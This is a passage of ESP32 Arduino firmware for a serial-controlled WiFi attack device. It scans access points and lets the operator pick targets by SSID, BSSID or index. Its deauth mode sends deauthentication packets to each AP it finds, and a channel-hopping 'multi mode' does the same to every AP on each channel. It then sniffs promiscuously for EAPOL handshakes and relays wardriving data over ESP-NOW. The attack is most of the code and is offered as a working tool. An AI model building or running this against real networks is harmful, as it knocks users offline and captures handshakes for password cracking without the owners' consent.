// 17. SCAN FUNCTIONS
// ─────────────────────────────────────────────
static void listLastScan() {
  outPrint("Last scan: "); outPrint((int)lastScanCount);
  outPrint(" AP(s) at "); outPrint((long)lastScanMs); outPrintln(" ms");
  outPrintln("idx | ch | rssi | auth | bssid | ssid");
  for (size_t i = 0; i < lastScanCount; ++i) {
    const ApInfo &ap = lastScan[i];
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            ap.bssid[0], ap.bssid[1], ap.bssid[2],
            ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    outPrint((int)i);      outPrint(" | ");
    outPrint((int)ap.channel); outPrint(" | ");
    outPrint((int)ap.rssi);    outPrint(" | ");
    outPrint(security_to_string(ap.auth)); outPrint(" | ");
    outPrint(buf);             outPrint(" | ");
    outPrintln(ap.ssid);
  }
}

static void sendListFramed(const CmdFrame &cmd) {
  sendEvt(cmd, "LIST_HEADER",
          "count=" + String(lastScanCount) + "|ms=" + String(lastScanMs));
  for (size_t i = 0; i < lastScanCount; ++i) {
    const ApInfo &ap = lastScan[i];
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            ap.bssid[0], ap.bssid[1], ap.bssid[2],
            ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    String line = "idx=" + String(i)
                + "|ch="   + String(ap.channel)
                + "|rssi=" + String(ap.rssi)
                + "|auth=" + String(security_to_string(ap.auth))
                + "|bssid="+ String(buf)
                + "|ssid=" + String(ap.ssid);
    sendEvt(cmd, "LIST_LINE", line);
  }
  sendEvt(cmd, "DONE", "");
}

static void scanOneChannelSilent(uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  int n = WiFi.scanNetworks(false, true, false, 500, ch);
  lastScanCount = 0;
  lastScanMs    = millis();
  if (n > 0) {
    for (int i = 0; i < n && lastScanCount < MAX_APS; ++i) {
      ApInfo &ap = lastScan[lastScanCount++];
      memset(ap.ssid, 0, sizeof(ap.ssid));
      WiFi.SSID(i).toCharArray(ap.ssid, sizeof(ap.ssid));
      memcpy(ap.bssid, WiFi.BSSID(i), 6);
      ap.rssi    = WiFi.RSSI(i);
      ap.channel = (uint8_t)WiFi.channel(i);
      ap.auth    = WiFi.encryptionType(i);
    }
  }
}

static void scanAllSilent() {
  refScanCount = 0;
  refScanMs    = millis();
  int n = WiFi.scanNetworks(false, true, false, 800, 0);
  for (int i = 0; i < n && refScanCount < MAX_APS; ++i) {
    ApInfo &ap = refScan[refScanCount++];
    memset(ap.ssid, 0, sizeof(ap.ssid));
    WiFi.SSID(i).toCharArray(ap.ssid, sizeof(ap.ssid));
    memcpy(ap.bssid, WiFi.BSSID(i), 6);
    ap.rssi    = WiFi.RSSI(i);
    ap.channel = (uint8_t)WiFi.channel(i);
    ap.auth    = WiFi.encryptionType(i);
  }
  lastScanCount = 0;
  for (size_t i = 0; i < refScanCount && lastScanCount < MAX_APS; ++i)
    lastScan[lastScanCount++] = refScan[i];
  lastScanMs = refScanMs;
}

static void scanSelectedChannelsSilent() {
  lastScanCount = 0;
  lastScanMs    = millis();
  if (activeChannelCount == 0) return;
  for (size_t ci = 0; ci < activeChannelCount && lastScanCount < MAX_APS; ++ci) {
    uint8_t ch = activeChannels[ci];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    int n = WiFi.scanNetworks(false, true, false, 500, ch);
    if (n > 0) {
      for (int i = 0; i < n && lastScanCount < MAX_APS; ++i) {
        ApInfo &ap = lastScan[lastScanCount++];
        memset(ap.ssid, 0, sizeof(ap.ssid));
        WiFi.SSID(i).toCharArray(ap.ssid, sizeof(ap.ssid));
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.rssi    = WiFi.RSSI(i);
        ap.channel = (uint8_t)WiFi.channel(i);
        ap.auth    = WiFi.encryptionType(i);
      }
    }
    WiFi.scanDelete();
  }
}


// ─────────────────────────────────────────────
// 18. DEAUTH MODE: performScanDeauth
// ─────────────────────────────────────────────
static void performScanDeauth(bool allowDeauth) {
  if (activeChannelCount == 0) return;
  uint8_t ch = activeChannels[channelIndex];
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  setLed(true);

  int  n          = WiFi.scanNetworks(false, true, false, 500, ch);
  bool didDeauth  = false;
  lastScanCount   = 0;
  lastScanMs      = millis();

  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      String          ssid   = WiFi.SSID(i);
      const uint8_t  *bssid  = WiFi.BSSID(i);
      int32_t         rssi   = WiFi.RSSI(i);
      wifi_auth_mode_t auth  = WiFi.encryptionType(i);
      uint8_t         realCh = (uint8_t)WiFi.channel(i);
      bool            isTarget = targetMatch(ssid, bssid);

      if ((targetSSIDSet || targetBSSIDSet || targetBSSIDCount > 0) && !isTarget) continue;

      if (lastScanCount < MAX_APS) {
        ApInfo &ap = lastScan[lastScanCount++];
        memset(ap.ssid, 0, sizeof(ap.ssid));
        ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
        memcpy(ap.bssid, bssid, 6);
        ap.rssi    = rssi;
        ap.channel = realCh;
        ap.auth    = auth;
      }

      outPrintln("=== Access Point Information ===");
      outPrint("SSID: ");           outPrintln(ssid);
      outPrint("BSSID (MAC): ");    outPrintln(WiFi.BSSIDstr(i));
      outPrint("Security: ");       outPrintln(security_to_string(auth));
      outPrint("RSSI: ");           outPrint((int)rssi); outPrintln(" dBm");
      outPrint("Channel: ");        outPrintln((int)realCh);
      outPrintln("===============================");

      if (!allowDeauth) continue;
      if (already_seen_deauth(bssid)) {
        outPrintln(String("Already deauthed: ") + WiFi.BSSIDstr(i));
        continue;
      }
      save_mac_deauth(bssid);
      sendDeauthPacket(bssid, realCh);
      didDeauth = true;
    }
  }
  setLed(false);
  channelIndex = (channelIndex + 1) % activeChannelCount;
  t_lastScan   = millis();
  maybeSniffHandshakeAfterDeauth(didDeauth, ch);
}


// ─────────────────────────────────────────────
// 19. WARDRIVING SCAN
// ─────────────────────────────────────────────
static int performScanOneChannel(bool sendOverEspNow, const CmdFrame *origin) {
  if (activeChannelCount == 0) return 0;
  uint8_t ch = activeChannels[channelIndex];
  channelIndex = (channelIndex + 1) % activeChannelCount;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  setLed(true);

  int n    = WiFi.scanNetworks(false, true, false, 500, ch);
  int sent = 0;

  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      const uint8_t *bssid = WiFi.BSSID(i);
      if (already_seen(bssid)) continue;
      save_mac(bssid);
      if (sendOverEspNow) {
        struct_message msg = {};
        WiFi.BSSIDstr(i).toCharArray(msg.bssid, sizeof(msg.bssid));
        WiFi.SSID(i).toCharArray(msg.ssid, sizeof(msg.ssid));
        authToShortString(WiFi.encryptionType(i)).toCharArray(msg.encryptionType, sizeof(msg.encryptionType));
        msg.channel = (int32_t)WiFi.channel(i);
        msg.rssi    = (int32_t)WiFi.RSSI(i);
        msg.boardID = (int)ch;
        sendEspNowAp(msg, kEspNowTxChannel);   // stay on TX ch after send; next iteration sets scan ch
        sent++;
        outPrintf("WARD|scan_ch=%u|ap_ch=%ld|rssi=%ld|enc=%s|bssid=%s|ssid=%s\n",
                  (unsigned)ch, (long)msg.channel, (long)msg.rssi,
                  msg.encryptionType, msg.bssid, msg.ssid);
      }
    }
  }

  if (sendOverEspNow)
    outPrintf("WARD|tick|scan_ch=%u|n=%d|sent=%d\n", (unsigned)ch, n, sent);

  WiFi.scanDelete();
  setLed(false);
  if (origin && origin->framed)
    sendEvt(*origin, "INFO", "ch=" + String(ch) + "|sent=" + String(sent));
  return sent;
}

static int performFullScanAllChannels(bool sendOverEspNow, const CmdFrame &origin) {
  setLed(true);
  int n    = WiFi.scanNetworks(false, true, false, 900, 0);
  int sent = 0;
  if (n > 0 && sendOverEspNow) {
    for (int i = 0; i < n; ++i) {
      const uint8_t *bssid = WiFi.BSSID(i);
      if (already_seen(bssid)) continue;
      save_mac(bssid);
      struct_message msg = {};
      WiFi.BSSIDstr(i).toCharArray(msg.bssid, sizeof(msg.bssid));
      WiFi.SSID(i).toCharArray(msg.ssid, sizeof(msg.ssid));
      authToShortString(WiFi.encryptionType(i)).toCharArray(msg.encryptionType, sizeof(msg.encryptionType));
      msg.channel = (int32_t)WiFi.channel(i);
      msg.rssi    = (int32_t)WiFi.RSSI(i);
      msg.boardID = (int)msg.channel;
      sendEspNowAp(msg, (uint8_t)msg.channel);
      sent++;
      outPrintf("WARD|scan_ch=%ld|ap_ch=%ld|rssi=%ld|enc=%s|bssid=%s|ssid=%s\n",
                (long)msg.channel, (long)msg.channel, (long)msg.rssi,
                msg.encryptionType, msg.bssid, msg.ssid);
    }
  }
  WiFi.scanDelete();
  setLed(false);
  sendEvt(origin, "DONE", "sent=" + String(sent) + "|n=" + String(n));
  return sent;
}

static void wardriveScan() {
  if (!scanRunning) return;
  unsigned long now = millis();
  if (!manualScanPending && now - t_lastScan < scanInterval) return;
  manualScanPending = false;
  performScanOneChannel(true, nullptr);
  t_lastScan = millis();
}


// ─────────────────────────────────────────────
// 20. SNIFF / HANDSHAKE CAPTURE HELPERS
// ─────────────────────────────────────────────
static void maybeSniffHandshakeAfterDeauth(bool didDeauth, uint8_t ch) {
  if (!sniffEnabled || !didDeauth) return;
  outPrintln("=== Waiting for EAPOL + Beacon ===");
  resetCaptureState();
  setLed(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
  esp_wifi_set_promiscuous(true);

  unsigned long startSniff = millis();
  while (!allFramesCollected && millis() - startSniff < sniffTimeoutMs) delay(5);

  if (!allFramesCollected) {
    outPrintln("=== Timeout sniff. ===");
    esp_wifi_set_promiscuous(false);
    resetCaptureState();
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    setLed(false);
    return;
  }
  while ((isSending || waitingForSendCompletion) && scanRunning) delay(1);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void sniffOnlyOneChannel(uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  resetCaptureState();
  setLed(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
  esp_wifi_set_promiscuous(true);

  unsigned long startSniff = millis();
  while (!allFramesCollected && millis() - startSniff < sniffTimeoutMs) delay(5);

  if (!allFramesCollected) {
    outPrintln("=== Timeout sniff. ===");
    esp_wifi_set_promiscuous(false);
    resetCaptureState();
    setLed(false);
    return;
  }
  while ((isSending || waitingForSendCompletion) && scanRunning) delay(1);
  setLed(false);
}


// ─────────────────────────────────────────────
// 21. MULTI MODE LOOP
// ─────────────────────────────────────────────
static void multiLoop() {
  if (!scanRunning) { esp_wifi_set_promiscuous(false); return; }
  if (isSending || waitingForSendCompletion) return;

  esp_wifi_set_promiscuous(false);
  delay(1);

  uint8_t ch = channelsToHop[currentHopIndex];
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  delay(5);
  setLed(true);
  outPrintf("\n=== Scanning & Deauth on channel %d ===\n", ch);

  int n = WiFi.scanNetworks(false, false, false, 250, ch);
  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      const uint8_t *bssid = WiFi.BSSID(i);
      if (already_seen_deauth(bssid)) continue;
      outPrintf("---- AP trouve ----\n  SSID: %s\n  BSSID: %s\n"
                "  Security: %s\n  RSSI: %d dBm\n  Channel: %d\n--------------------\n",
                WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
                security_to_string(WiFi.encryptionType(i)), WiFi.RSSI(i), ch);
      save_mac_deauth(bssid);
      sendDeauthPacket(bssid, ch);
    }
    outPrintln("=== Waiting for EAPOL + Beacon ===");
    setLed(false);
    WiFi.scanDelete();
    resetCaptureState();
    setLed(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
    esp_wifi_set_promiscuous(true);

    unsigned long start       = millis();
    const unsigned long sniffTimeout = 1500;
    while (!allFramesCollected && millis() - start < sniffTimeout) delay(5);

    if (!allFramesCollected) {
      outPrintln("=== Timeout sniff. ===");
      resetCaptureState();
    }
    while (isSending || waitingForSendCompletion) delay(1);
  } else {
    outPrintln("No AP on channel " + String(ch));
    setLed(true);
    WiFi.scanDelete();
  }

  if (!waitingForSendCompletion)
    currentHopIndex = (currentHopIndex + 1) % NUM_HOP_CHANNELS;
  if (currentHopIndex == 0) { clear_mac_history_deauth(); }
}


// ─────────────────────────────────────────────
// 22. SERIAL FRAMED PROTOCOL HELPERS
// ─────────────────────────────────────────────
static bool parseCmdFrame(const String &line, CmdFrame &out) {
  String s = line;
  s.trim();
  out = CmdFrame{};
  if (!s.startsWith("CMD|")) return false;
  String fields[4];
  size_t cnt = 0;
  String cur = "";
  bool   esc = false;
  for (size_t i = 0; i < s.length(); ++i) {
    char c = s[i];
    if (!esc && c == '\\') { esc = true; cur += c; continue; }
    if (!esc && c == '|' && cnt < 3) { fields[cnt++] = cur; cur = ""; continue; }
    esc = false;
    cur += c;
  }
  fields[cnt++] = cur;
  if (cnt < 3) return false;
  if (!fields[0].equalsIgnoreCase("CMD")) return false;
  out.type    = fields[1];
  out.seq     = (uint8_t)fields[2].toInt();
  out.payload = (cnt >= 4) ? fields[3] : "";
  out.framed  = true;
  return true;
}

static String payloadGet(const String &payload, const char *key) {
  size_t pos = 0;
  String tok;
  while (pos <= payload.length()) {
    size_t start = pos;
    bool   esc   = false;
    tok = "";
    while (pos < payload.length()) {
      char c = payload[pos++];
      if (!esc && c == '\\') { esc = true; tok += c; continue; }
      if (!esc && c == '|')  break;
      esc = false;
      tok += c;
    }
    tok.trim();
    if (tok.length() == 0) { if (pos >= payload.length()) break; else continue; }
    int    eq = tok.indexOf('=');
    if (eq <= 0) { if (pos >= payload.length() && start == pos) break; continue; }
    String k  = tok.substring(0, eq);
    String v  = tok.substring(eq + 1);
    k.trim();
    if (k.equalsIgnoreCase(key)) return v;
    if (pos >= payload.length()) break;
  }
  return "";
}

static void sendAck(const CmdFrame &c, const String &payload) {
  if (!c.framed) return;
  outPrint("ACK|"); outPrint(c.type); outPrint("|");
  outPrint((int)c.seq); outPrint("|"); outPrintln(payload);
}
static void sendErr(const CmdFrame &c, const String &code, const String &msg) {
  if (!c.framed) return;
  outPrint("ERR|"); outPrint(c.type); outPrint("|");
  outPrint((int)c.seq); outPrint("|code="); outPrint(code);
  outPrint("|msg="); outPrintln(msg);
}
static void sendEvt(const CmdFrame &cmd, const String &type, const String &payload) {
  if (!cmd.framed) return;
  outPrint("EVT|"); outPrint(type); outPrint("|");
  outPrint((int)cmd.seq); outPrint("|"); outPrintln(payload);
}


// ─────────────────────────────────────────────
// 23. COMMAND HANDLER
// ─────────────────────────────────────────────
static void printHelp() {
  outPrintln("Commands:");
  outPrintln("  HELP");
  outPrintln("  WARD ON|OFF");
  outPrintln("  WARD HISTORY <ms>");
  outPrintln("  INFO");
  outPrintln("  START | STOP");
  outPrintln("  SCAN | SCAN ALL");
  outPrintln("  LIST");
  outPrintln("  SNIFF ON|OFF");
  outPrintln("  SNIFF_TIMEOUT <ms>");
  outPrintln("  DEAUTH ON|OFF");
  outPrintln("  CHAN SET/ADD/RESET/CLEAR");
  outPrintln("  TARGET SSID/BSSID/INDEX/CLEAR");
  outPrintln("  INTERVAL <ms>");
  outPrintln("  HISTORY <ms>");
  outPrintln("  LED OFF|ON");
  outPrintln("  FACTORY           (reset all settings to defaults)");
  outPrintln("  ESPNOW PEER <mac> / ESPNOW CH <n|0> / ESPNOW INFO");
}

static void printInfoConfig(const char *title) {
  outPrint("=== "); outPrint(title); outPrintln(" ===");
  outPrintln("persistence: NVS");
  outPrint("wardEnabled: ");           outPrintln(wardEnabled     ? "ON" : "OFF");
  outPrint("wardHistoryReset: ");      outPrintln((long)wardHistoryReset);
  outPrint("scanRunning: ");           outPrintln(scanRunning     ? "ON" : "OFF");
  outPrint("deauthEnabled: ");         outPrintln(deauthEnabled   ? "ON" : "OFF");
  outPrint("sniffEnabled: ");          outPrintln(sniffEnabled    ? "ON" : "OFF");
  outPrint("sniffSendEspNowEnabled: ");outPrintln(sniffSendEspNowEnabled ? "ON" : "OFF");
  outPrint("sniffTimeoutMs: ");        outPrintln((long)sniffTimeoutMs);
  outPrint("scanInterval: ");          outPrintln((long)scanInterval);
  outPrint("historyReset: ");          outPrintln((long)historyReset);

  outPrint("targetSSID: ");
  if (!targetSSIDSet || targetSSIDCount == 0) {
    outPrintln("(none)");
  } else {
    for (size_t i = 0; i < targetSSIDCount; ++i) {
      outPrint(targetSSIDs[i]);
      if (i + 1 < targetSSIDCount) outPrint(",");
    }
    outPrintln();
  }
  outPrint("targetBSSID: ");
  if (targetBSSIDSet) {
    char tb[18];
    sprintf(tb, "%02X:%02X:%02X:%02X:%02X:%02X",
            targetBSSID[0], targetBSSID[1], targetBSSID[2],
            targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    outPrintln(tb);
  } else {
    outPrintln("(none)");
  }
  outPrint("targetIndexCount: "); outPrintln((int)targetBSSIDCount);
  outPrint("targetIndexList: ");
  if (targetBSSIDCount == 0) {
    outPrintln("(none)");
  } else {
    for (size_t i = 0; i < targetBSSIDCount; ++i) {
      char mb[18];
      sprintf(mb, "%02X:%02X:%02X:%02X:%02X:%02X",
              targetBSSIDList[i][0], targetBSSIDList[i][1], targetBSSIDList[i][2],
              targetBSSIDList[i][3], targetBSSIDList[i][4], targetBSSIDList[i][5]);
      outPrint(mb);
      if (i + 1 < targetBSSIDCount) outPrint(",");
    }
    outPrintln();
  }
  outPrint("espnowPeer: ");
  char b[18];
  sprintf(b, "%02X:%02X:%02X:%02X:%02X:%02X",
          espNowPeerMac[0], espNowPeerMac[1], espNowPeerMac[2],
          espNowPeerMac[3], espNowPeerMac[4], espNowPeerMac[5]);
  outPrintln(b);
  outPrint("espnowTxChannel: "); outPrintln((int)espNowChannel);
  outPrint("channels("); outPrint((int)activeChannelCount); outPrint("): ");
  for (size_t i = 0; i < activeChannelCount; ++i) {
    outPrint((int)activeChannels[i]);
    if (i + 1 < activeChannelCount) outPrint(",");
  }
  outPrintln();
}

static void handleCommand(const String &line) {
  String cmd   = line;
  cmd.trim();
  if (cmd.length() == 0) return;
  String upper = cmd;
  upper.toUpperCase();

  CmdFrame frame;
  bool framed = parseCmdFrame(cmd, frame);

  auto ack = [&](const String &p = "") { if (framed) sendAck(frame, p); };
  auto err = [&](const String &code, const String &msg) {
    if (framed) sendErr(frame, code, msg);
    else outPrintln("ERR " + code + " " + msg);
  };

  // HELP
  if (upper == "HELP" || (framed && frame.type.equalsIgnoreCase("HELP"))) {
    printHelp(); ack("ok"); return;
  }

  // INFO / CONFIG
  if (upper == "INFO" || upper == "CONFIG"
      || (framed && (frame.type.equalsIgnoreCase("INFO")
                  || frame.type.equalsIgnoreCase("CONFIG")))) {
    printInfoConfig("Info"); ack("ok"); return;
  }

  // FACTORY RESET
  if (upper == "FACTORY" || upper == "RESET"
      || (framed && (frame.type.equalsIgnoreCase("FACTORY")
                  || frame.type.equalsIgnoreCase("RESET")))) {
    resetState();
    outPrintln("Factory reset. All state cleared.");
    ack("ok"); return;
  }

  // Framed-only scan/list
  if (framed) {
    if (frame.type.equalsIgnoreCase("SCAN")) {
      if (activeChannelCount == 0) { sendErr(frame, "EMPTY", "no_channels"); return; }
      sendAck(frame, "ok"); scanSelectedChannelsSilent(); sendListFramed(frame); return;
    }
    if (frame.type.equalsIgnoreCase("SCAN_ALL")) {
      sendAck(frame, "ok"); scanAllSilent(); sendListFramed(frame); return;
    }
    if (frame.type.equalsIgnoreCase("LIST")) {
      sendAck(frame, "ok"); sendListFramed(frame); return;
    }
  }

  // WARD HISTORY <ms>
  if (upper.startsWith("WARD HISTORY ")) {
    wardHistoryReset = (unsigned long)cmd.substring(13).toInt();
    if (framed) ack("ms=" + String(wardHistoryReset));
    else outPrintln("wardHistoryReset updated.");
    saveState(); return;
  }

  // WARD ON|OFF
  if (upper.startsWith("WARD ") || (framed && frame.type.equalsIgnoreCase("WARD"))) {
    String a = framed ? payloadGet(frame.payload, "state") : cmd.substring(5);
    a.trim(); a.toUpperCase();
    wardEnabled = (a == "ON");
    if (wardEnabled) { deauthEnabled = false; sniffEnabled = false; }
    if (framed) ack("state=" + String(wardEnabled ? "ON" : "OFF"));
    else { outPrint("Ward: "); outPrintln(wardEnabled ? "ON" : "OFF"); }
    saveState(); return;
  }

  // START / STOP
  if (upper == "START") {
    scanRunning = true; t_lastClear = millis();
    if (framed) ack("ok"); else outPrintln("Scan START");
    saveState(); return;
  }
  if (upper == "STOP") {
    scanRunning = false;
    if (framed) ack("ok"); else outPrintln("Scan STOP");
    saveState(); return;
  }

  // LIST
  if (upper == "LIST") { listLastScan(); ack("ok"); return; }

  // SNIFF ON|OFF
  if (upper.startsWith("SNIFF ") || upper.startsWith("SNIFF_SEND ")) {
    int    offset = upper.startsWith("SNIFF_SEND ") ? 11 : 6;
    String a      = cmd.substring(offset);
    a.trim(); a.toUpperCase();
    sniffEnabled = sniffSendEspNowEnabled = (a == "ON");
    if (framed) ack("state=" + String(sniffEnabled ? "ON" : "OFF"));
    else { outPrint("Sniff: "); outPrintln(sniffEnabled ? "ON" : "OFF"); }
    saveState(); return;
  }

  // SNIFF_TIMEOUT <ms>
  if (upper.startsWith("SNIFF_TIMEOUT ")) {
    sniffTimeoutMs = (unsigned long)cmd.substring(14).toInt();
    if (framed) ack("ms=" + String(sniffTimeoutMs));
    else outPrintln("sniffTimeout updated.");
    saveState(); return;
  }

  // LED ON|OFF
  if (upper == "LED OFF") { ledEnabled = false; digitalWrite(LED_PIN, HIGH); ack("off"); saveState(); return; }
  if (upper == "LED ON")  { ledEnabled = true;  setLed(true);  ack("on");  saveState(); return; }

  // HISTORY CLEAR
  if (upper == "HISTORY CLEAR" || (framed && frame.type.equalsIgnoreCase("HISTORY"))) {
    clear_mac_history(); clear_mac_history_deauth();
    if (framed) ack("ok"); else outPrintln("MAC history cleared."); return;
  }

  // DEAUTH ON|OFF
  if (upper.startsWith("DEAUTH ")) {
    String a = cmd.substring(7); a.trim(); a.toUpperCase();
    deauthEnabled = (a == "ON");
    if (framed) ack("state=" + a);
    else { outPrint("Deauth: "); outPrintln(deauthEnabled ? "ON" : "OFF"); }
    saveState(); return;
  }

  // INTERVAL <ms>
  if (upper.startsWith("INTERVAL ")) {
    scanInterval = (unsigned long)cmd.substring(9).toInt();
    if (framed) ack("ms=" + String(scanInterval));
    else outPrintln("scanInterval updated.");
    saveState(); return;
  }

  // HISTORY <ms>
  if (upper.startsWith("HISTORY ")) {
    historyReset = (unsigned long)cmd.substring(8).toInt();
    if (framed) ack("ms=" + String(historyReset));
    else outPrintln("historyReset updated.");
    saveState(); return;
  }

  // CHAN
  if (upper == "CHAN RESET") { resetActiveChannels(); ack("ok"); if (!framed) outPrintln("Channels reset."); saveState(); return; }
  if (upper == "CHAN CLEAR") { activeChannelCount = 0; channelIndex = 0; ack("ok"); if (!framed) outPrintln("Channels cleared."); saveState(); return; }
  if (upper.startsWith("CHAN SET ") || upper.startsWith("MULTI CHAN_SET ")) {
    int off = upper.startsWith("MULTI CHAN_SET ") ? 15 : 9;
    addChannelsFromList(cmd.substring(off), true);
    ack("ok"); if (!framed) outPrintln("Channels set."); saveState(); return;
  }
  if (upper.startsWith("CHAN ADD ")) {
    addChannelsFromList(cmd.substring(9), false);
    ack("ok"); if (!framed) outPrintln("Channels added."); saveState(); return;
  }

  // SCAN / SCAN ALL
  if (upper == "SCAN") {
    if (!framed) outPrintln("Manual scan requested.");
    scanSelectedChannelsSilent(); listLastScan(); ack("ok"); return;
  }
  if (upper == "SCAN ALL") {
    if (!framed) outPrintln("Full scan requested (REFERENCE).");
    scanAllSilent(); listLastScan(); ack("ok"); return;
  }

  // TARGET
  if (upper.startsWith("TARGET CLEAR")) {
    targetSSIDSet = targetBSSIDSet = false;
    targetSSIDCount = targetBSSIDCount = 0;
    ack("ok"); if (!framed) outPrintln("Targets cleared."); saveState(); return;
  }
  if (upper.startsWith("TARGET SSID ")) {
    String ssids = cmd.substring(12); ssids.trim();
    setTargetSsidsFromCsv(ssids);
    targetBSSIDSet = false; targetBSSIDCount = 0;
    if (targetSSIDSet) setChannelsFromRefScanForSsidList();
    if (framed) ack("ssid=" + ssids);
    else { outPrint("Target SSID: "); outPrintln(targetSSIDSet ? ssids : "(none)"); }
    saveState(); return;
  }
  if (upper.startsWith("TARGET BSSID ")) {
    String mac = cmd.substring(13); mac.trim();
    if (parseMac(mac, targetBSSID)) {
      targetBSSIDSet = true; targetBSSIDCount = 0;
      setChannelsFromRefScanForBssid(targetBSSID);
      ack("ok"); if (!framed) outPrintln("Target BSSID set.");
      saveState();
    } else err("BAD_MAC", "format");
    return;
  }
  if (upper.startsWith("TARGET INDEX ")) {
    String list = cmd.substring(13); list.replace(" ", "");
    targetBSSIDCount = 0;
    targetSSIDSet = targetBSSIDSet = false;
    activeChannelCount = 0; channelIndex = 0;
    while (list.length() > 0) {
      int    comma    = list.indexOf(',');
      String tok      = (comma >= 0) ? list.substring(0, comma) : list;
      list            = (comma >= 0) ? list.substring(comma + 1) : "";
      int    dash     = tok.indexOf('-');
      int    startIdx = tok.toInt(), endIdx = startIdx;
      if (dash >= 0) { startIdx = tok.substring(0, dash).toInt(); endIdx = tok.substring(dash+1).toInt(); }
      if (endIdx < startIdx) { int t = startIdx; startIdx = endIdx; endIdx = t; }
      for (int idx = startIdx; idx <= endIdx; ++idx) {
        if (idx < 0 || (size_t)idx >= refScanCount) continue;
        const ApInfo &ap = refScan[idx];
        bool dup = false;
        for (size_t i = 0; i < targetBSSIDCount; ++i)
          if (!memcmp(targetBSSIDList[i], ap.bssid, 6)) dup = true;
        if (!dup && targetBSSIDCount < MAX_TARGET_BSSIDS)
          memcpy(targetBSSIDList[targetBSSIDCount++], ap.bssid, 6);
        addActiveChannel(ap.channel);
      }
    }
    if (targetBSSIDCount == 0) err("BAD_INDEX", "use SCAN ALL");
    else { ack("count=" + String(targetBSSIDCount)); saveState(); }
    return;
  }

  // ESPNOW
  if (upper.startsWith("ESPNOW ") || (framed && frame.type.equalsIgnoreCase("ESPNOW"))) {
    String sub = framed
      ? payloadGet(frame.payload, "sub")
      : cmd.substring(7, cmd.indexOf(' ', 7) < 0 ? cmd.length() : cmd.indexOf(' ', 7));
    sub.trim(); sub.toUpperCase();
    if (sub == "PEER") {
      String mac = framed ? payloadGet(frame.payload, "mac") : cmd.substring(cmd.lastIndexOf(' ') + 1);
      mac.trim();
      if (parseMac(mac, espNowPeerMac)) { espNowReady = false; ack("peer=" + mac); }
      else err("BAD_MAC", "format");
      return;
    }
    if (sub == "CH") {
      espNowChannel = 1; espNowReady = false;
      ack("ch=" + String(espNowChannel)); return;
    }
    if (sub == "INFO") {
      char buf[18];
      sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
              espNowPeerMac[0], espNowPeerMac[1], espNowPeerMac[2],
              espNowPeerMac[3], espNowPeerMac[4], espNowPeerMac[5]);
      outPrint("ESP-NOW peer: "); outPrintln(buf);
      outPrint("channel: ");      outPrintln((int)espNowChannel);
      outPrintln("note: tx_forced_ch1");
      ack("ok"); return;
    }
    err("BAD_SUB", "PEER/CH/INFO"); return;
  }

  outPrintln("Unknown command. Type HELP.");
}

static void readSerialLines() {
  while (Serial.available()) {
    char c = Serial.read();
    if      (c == '\n') { handleCommand(serialLineUsb);  serialLineUsb  = ""; }
    else if (c != '\r')   serialLineUsb  += c;
  }
  while (SerialUART.available()) {
    char c = SerialUART.read();
    if      (c == '\n') { handleCommand(serialLineUart); serialLineUart = ""; }
    else if (c != '\r')   serialLineUart += c;
  }
}


// ─────────────────────────────────────────────
// 24. SETUP / LOOP
// ─────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  SerialUART.begin(115200, SERIAL_8N1, RX_PIN, TX_PIN);
  pinMode(LED_PIN, OUTPUT);
  setLed(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_max_tx_power(84);

  loadState();  // Restore persisted state (handles first boot via defaults)

  clear_mac_history();
  clear_mac_history_deauth();

  if (!ledEnabled) digitalWrite(LED_PIN, HIGH);
}

void loop() {
  readSerialLines();
  unsigned long now = millis();

  if ((scanRunning || manualScanPending)
      && (manualScanPending || now - t_lastScan >= scanInterval)) {
    if (wardEnabled) {
      // Wardriving: passive scan + ESP-NOW send, no deauth/sniff.
      performScanOneChannel(true, nullptr);
      t_lastScan        = now;
      manualScanPending = false;
    } else {
      if (sniffEnabled && !deauthEnabled) {
        if (activeChannelCount == 0) return;
        uint8_t ch = activeChannels[channelIndex];
        channelIndex = (channelIndex + 1) % activeChannelCount;
        outPrintf("SNIFF|passive|ch=%u|timeout=%lu\n",
                  (unsigned)ch, (unsigned long)sniffTimeoutMs);
        outPrintln("=== Waiting for EAPOL + Beacon ===");
        sniffOnlyOneChannel(ch);
        t_lastScan        = now;
        manualScanPending = false;
      } else {
        performScanDeauth(deauthEnabled);
      }
    }
  }

  if (now - t_lastClear >= historyReset) {
    clear_mac_history_deauth();
    t_lastClear = now;
  }
  if (wardHistoryReset > 0 && (now - t_lastClearWard >= wardHistoryReset)) {
    clear_mac_history();
    t_lastClearWard = now;
  }
}
